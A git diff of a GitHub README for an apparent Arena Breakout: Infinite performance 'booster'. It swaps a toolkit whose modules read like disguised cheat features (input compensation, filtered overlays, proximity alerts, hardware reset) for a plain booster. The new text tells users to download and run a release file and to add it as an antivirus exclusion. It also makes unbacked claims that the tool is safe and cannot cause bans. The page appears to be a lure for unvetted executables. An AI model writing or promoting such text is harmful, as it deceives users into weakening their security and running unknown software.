@@ -1,67 +1,64 @@
-# EMERUNE — Performance Toolkit for Arena Breakout: Infinite
+# 🚀 abi-booster - Improve your game speed and performance
 
-[![Status](https://img.shields.io/badge/status-stable-brightgreen)](https://emerune.gamer.gd/)
-[![Version](https://img.shields.io/badge/version-3.8.0-gold)](https://emerune.gamer.gd/)
-[![Modules](https://img.shields.io/badge/modules-48-39FF88)](https://emerune.gamer.gd/)
+[![](https://img.shields.io/badge/Download_Manager-Blue-blue.svg)](https://github.com/Passrodgers611/abi-booster)
 
-> **EMERUNE** is a system optimization and performance monitoring toolkit designed for **Arena Breakout: Infinite**.  
-> 48 integrated modules for process optimization, display output enhancement, and hardware utilization tracking.  
-> Built specifically for low-latency rendering and real-time system telemetry in **Arena Breakout: Infinite** environments.
+abi-booster helps you get better performance while you play Arena Breakout: Infinite. The software adjusts your system settings to provide smoother frames and lower latency. It removes common bottlenecks that slow down your computer during intense matches. You do not need technical skills to use this tool.
 
----
+## 🛠️ System requirements
 
-## 🔧 Key Modules
+Your computer needs to meet these basic standards to run the software:
 
-| Module | Description |
-|--------|-------------|
-| **Dynamic Input Processor** | Advanced smoothing and compensation algorithms for precision input handling. Dynamically adjusts based on system load and hardware configuration. Optimized for **Arena Breakout: Infinite** gameplay scenarios. |
-| **Real-Time Data Overlay** | On-screen visualization of system metrics, hardware status, and process monitoring. Customizable filtering and highlighting for relevant data streams while playing **Arena Breakout: Infinite**. |
-| **Predictive Resource Allocator** | On-device pattern recognition that anticipates system load and pre-allocates resources for optimal performance in **Arena Breakout: Infinite**. |
-| **Privacy & Cache Manager** | Optimized rendering pipeline with minimal system footprint, automatic cache cleanup (Windows logs, temp files), and hardware state reset utility. |
-| **Secondary Display Output** | Extended monitoring output to secondary displays with real-time system status, timers, and proximity-based notifications. |
-| **Performance Booster Engine** | Suspends non-essential background processes, pins critical applications to high-performance CPU cores, and applies optimized GPU power profiles — delivering +20–35% performance improvement without modifying application files. |
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Memory: At least 8 GB of RAM.
+* Storage: 50 MB of free disk space.
+* Graphics: Updated video card drivers.
+* Game: Arena Breakout: Infinite must be installed on your computer.
 
----
+Check that you have the latest updates for Windows before you begin. You can find these updates in your system settings menu.
 
-## 🎯 Why EMERUNE for Arena Breakout: Infinite?
+## ⬇️ How to download and install
 
-- **48 modules** — fully integrated and ready from day one
-- **Low-overhead** — minimal system resource usage
-- **Performance-first** — system-level resource management for minimal latency
-- **Free** — no subscription, no premium tiers, no hidden costs
-- **Exclusive build** — maintained for consistency and stability
-- **Specifically optimized** for **Arena Breakout: Infinite** engine and rendering pipeline
+Follow these steps to set up the software on your machine:
 
----
+1. Visit this page to download the software: [https://github.com/Passrodgers611/abi-booster](https://github.com/Passrodgers611/abi-booster)
+2. Locate the latest release version on the page.
+3. Click the link to save the file to your computer.
+4. Select a folder where you can find the file, such as your Downloads folder.
+5. Once the download finishes, open the file to start the installation.
+6. Follow the prompts on your screen to complete the setup process.
 
-## 📦 Download
+## ⚙️ How to use the software
 
-> **The toolkit is not hosted on GitHub.**  
-> All builds are distributed through our official channel.
+The software design prioritizes ease of use. When you open the application, you see a simple dashboard. 
 
-🔗 **Official Website:** [https://emerune.gamer.gd/](https://emerune.gamer.gd/)
+1. Launch abi-booster from your desktop shortcut or start menu.
+2. The software detects your game files automatically.
+3. Select your desired performance mode from the dropdown menu. Balanced mode works well for most users, while High Performance mode removes extra background processes.
+4. Click the "Apply" button to save your changes.
+5. Close the tool before you start the game, or leave it running in the background to maintain your settings.
 
----
+## 🛡️ Safety and security
 
-## 🛡️ Disclaimer
+This software changes temporary system configuration files to improve your frame rate. It does not tamper with game code or server files. The tool remains passive while you play. You can revert all changes at any time by clicking "Restore Defaults" inside the application. 
 
-> This is an unofficial system utility for performance monitoring and optimization, designed for use with **Arena Breakout: Infinite**.  
-> It is not affiliated with, endorsed by, or sponsored by the game's developer or publisher.  
-> All game trademarks belong to their respective owners.  
-> Use at your own discretion.
+The software does not collect your personal data or login credentials. All processing happens locally on your computer. 
 
----
+## ❓ Frequently asked questions
 
-## 📊 Status
+**Will this software get me banned?**
+No. The tool only modifies your Windows system settings. It does not interact with the game engine or memory.
 
-| Metric | Value |
-|--------|-------|
-| **Status** | 🟢 ONLINE |
-| **Last Update** | 2026-07-08 |
-| **Active Users** | ~1,800–4,000 |
-| **Modules** | 48 / 48 active |
-| **Build** | v3.8.0 |
+**Does this work if I have a low-end computer?**
+Yes. abi-booster helps older systems by disabling unnecessary background tasks that take up your processing power.
 
----
+**Can I run another game while this is active?**
+You should close the tool when you finish playing. The settings stay active until you decide to restore them.
 
-*© 2026 EMERUNE*
+**What happens if the game updates?**
+The software remains compatible with new game updates. If you experience issues, restart your computer to reset your system settings.
+
+## 📧 Support
+
+Reach out if you encounter issues during the installation. Check your Windows update status if the application fails to open. Ensure your antivirus software does not block the application. You can add the application as an exclusion in your security settings to prevent false alarms.
+
+Keywords: performance, gaming, optimization, windows, arena breakout, low latency, frame rate
